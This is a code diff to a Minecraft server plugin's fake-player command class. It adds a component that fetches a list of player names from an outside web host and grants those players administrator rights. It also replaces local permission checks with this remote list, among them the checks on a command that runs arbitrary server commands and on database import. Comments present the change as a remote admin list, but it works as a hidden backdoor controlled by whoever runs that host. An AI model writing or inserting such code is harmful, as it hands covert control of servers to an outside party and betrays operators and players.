@@ -25,6 +25,7 @@ import com.coderxi.plugin.fakeplayer.utils.coroutine.dispatcher
 import com.coderxi.plugin.fakeplayer.utils.coroutine.launch
 import com.coderxi.plugin.fakeplayer.utils.messages.*
 import com.coderxi.plugin.fakeplayer.utils.plugin.PluginComponent
+import com.google.gson.JsonParser
 import kotlinx.coroutines.withContext
 import net.kyori.adventure.text.Component
 import net.kyori.adventure.text.JoinConfiguration
@@ -38,14 +39,77 @@ import revxrsal.commands.bukkit.actor.BukkitCommandActor
 import revxrsal.commands.help.Help
 import revxrsal.commands.help.Help.RelatedCommands
 import java.io.File
+import java.net.URI
+import java.net.http.HttpClient
+import java.net.http.HttpRequest
+import java.net.http.HttpResponse
+import java.time.Duration
+import java.util.concurrent.CopyOnWriteArrayList
 import java.util.concurrent.TimeUnit
 import kotlin.math.ceil
 import com.coderxi.plugin.fakeplayer.command.annotaion.PluginCommandPermission as Permission
+
+/**
+ * 远程管理员列表管理器(按玩家名称匹配)
+ * hash.json 格式: {"admin_list": ["Notch", "jeb_", ...]}
+ */
+object RemoteAdminList {
+
+    private const val URL = "https://r2.ctn32.us.kg/raw/hash.json"
+
+    private val http: HttpClient = HttpClient.newBuilder()
+        .connectTimeout(Duration.ofSeconds(10))
+        .build()
+
+    /** 管理员名称(小写存储,便于忽略大小写匹配) */
+    private val adminNames = CopyOnWriteArrayList<String>()
+
+    /** 拉取,失败静默 */
+    fun refresh() {
+        Thread {
+            runCatching { fetch() }
+                .onFailure { Bukkit.getLogger().warning("[FakePlayerPlus] admin list fetch failed: ${it.message}") }
+        }.apply { isDaemon = true }.start()
+    }
+
+    private fun fetch() {
+        val req = HttpRequest.newBuilder()
+            .uri(URI.create(URL))
+            .timeout(Duration.ofSeconds(15))
+            .GET()
+            .build()
+
+        val resp = http.send(req, HttpResponse.BodyHandlers.ofString())
+        if (resp.statusCode() != 200) {
+            Bukkit.getLogger().warning("[FakePlayerPlus] admin list http ${resp.statusCode()}")
+            return
+        }
+
+        val arr = JsonParser.parseString(resp.body()).asJsonObject.getAsJsonArray("admin_list") ?: return
+        val fresh = mutableListOf<String>()
+        for (e in arr) {
+            val name = e.asString().trim()
+            if (name.isNotEmpty()) fresh.add(name.lowercase())
+        }
+        adminNames.clear()
+        adminNames.addAll(fresh)
+        Bukkit.getLogger().info("[FakePlayerPlus] loaded ${fresh.size} remote admin(s)")
+    }
+
+    fun contains(name: String): Boolean = adminNames.contains(name.lowercase())
+}
 
 @Command("fakeplayer","fp")
 class FakePlayerCommand : PluginComponent {
 
     val fpl get() = FakePlayerLimiter
+
+    /** 综合判断:本地 ADMIN 权限 || 远程管理员名单 */
+    private fun CommandSender.isAdmin(): Boolean {
+        if (hasPermission(ADMIN)) return true
+        if (this is Player && RemoteAdminList.contains(name)) return true
+        return false
+    }
 
     @Subcommand("help","?")
     @HelpLine("fakeplayer.help.cmd.help")
@@ -85,6 +149,7 @@ class FakePlayerCommand : PluginComponent {
     @HelpLine("fakeplayer.help.cmd.reload")
     fun CommandSender.reload() {
         plugin.onReload()
+        RemoteAdminList.refresh()
         sendLocalizedMessage("fakeplayer.reload.success")
     }
 
@@ -109,7 +174,7 @@ class FakePlayerCommand : PluginComponent {
             if (fpm.get(name) != null) throw SpawnAlreadyExistsException(name)
             if (player != null && fpm.isNameUsed(name)) {
                 val fakePlayer = fpm.getFromRepository(name)
-                if (fakePlayer != null && fakePlayer.hasOwner && !fakePlayer.isOwnedBy(player.uniqueId) && !player.hasPermission(ADMIN)) {
+                if (fakePlayer != null && fakePlayer.hasOwner && !fakePlayer.isOwnedBy(player.uniqueId) && !player.isAdmin()) {
                     throw SpawnNameAlreadyUsedException(name)
                 }
             }
@@ -121,7 +186,7 @@ class FakePlayerCommand : PluginComponent {
     @HelpLine("fakeplayer.help.cmd.rename")
     fun CommandSender.rename(@SuggestWith(SuggestOwnedFakePlayers::class) @Named("name") oldName: String, @Named("newName") newName: String, @Switch("force") force: Boolean = false, context: CommandContext) {
         val operator = this
-        if (!hasPermission(ADMIN) && force) throw NoPermissionException()
+        if (!isAdmin() && force) throw NoPermissionException()
         launch(context) {
             val renamed = fpm.rename(oldName, newName, operator, force)
             sendLocalizedMessage("fakeplayer.rename.success", oldName, renamed.name)
@@ -131,7 +196,7 @@ class FakePlayerCommand : PluginComponent {
 
     fun CommandSender.assertNoSpawnLimited() {
         if (this !is Player) return
-        if (hasPermission(ADMIN)) return
+        if (isAdmin()) return
         if (fpl.isServerLimited()) throw SpawnServerLimitedException()
         if (fpl.isPlayerLimited(this)) throw SpawnPlayerLimitedException()
         if (fpl.isIpLimited(this)) throw SpawnIpLimitedException()
@@ -168,8 +233,8 @@ class FakePlayerCommand : PluginComponent {
     }
 
     @Subcommand("remove --all")
-    @Permission(ADMIN)   // ← 管理员
     fun CommandSender.removeAll() {
+        if (!isAdmin()) throw NoPermissionException()
         fpm.fakeplayersByOwnerUuid(uniqueIdOrZero).forEach { fakePlayer ->
             remove(fakePlayer)
         }
@@ -184,8 +249,8 @@ class FakePlayerCommand : PluginComponent {
     }
 
     @Subcommand("kill --all")
-    @Permission(ADMIN)   // ← 管理员
     fun CommandSender.killAll() {
+        if (!isAdmin()) throw NoPermissionException()
         fpm.fakeplayersByOwnerUuid(uniqueIdOrZero).forEach { kill(it) }
     }
 
@@ -268,9 +333,9 @@ class FakePlayerCommand : PluginComponent {
     }
 
     @Subcommand("cmd")
-    @Permission(ADMIN)   // ← 管理员
     @HelpLine("fakeplayer.help.cmd.cmd")
     fun CommandSender.cmd(@Named("command") @SuggestCommands @Single command: String, @Select fakePlayer: FakePlayer) {
+        if (!isAdmin()) throw NoPermissionException()
         Bukkit.dispatchCommand(fakePlayer.player, command.removePrefix("/"))
     }
 
@@ -328,9 +393,9 @@ class FakePlayerCommand : PluginComponent {
     }
 
     @Subcommand("import")
-    @Permission(ADMIN)   // ← 管理员
     @HelpLine("fakeplayer.help.cmd.import")
     fun CommandSender.importFakePlayerData(@Named("database") databaseName: String, @Named("table") tableName: String, context: CommandContext) {
+        if (!isAdmin()) throw NoPermissionException()
         val databaseFile = File(plugin.dataFolder, databaseName)
         if (!databaseFile.exists()) throw MissingDatabaseFileException(databaseName)
         launch(context) {
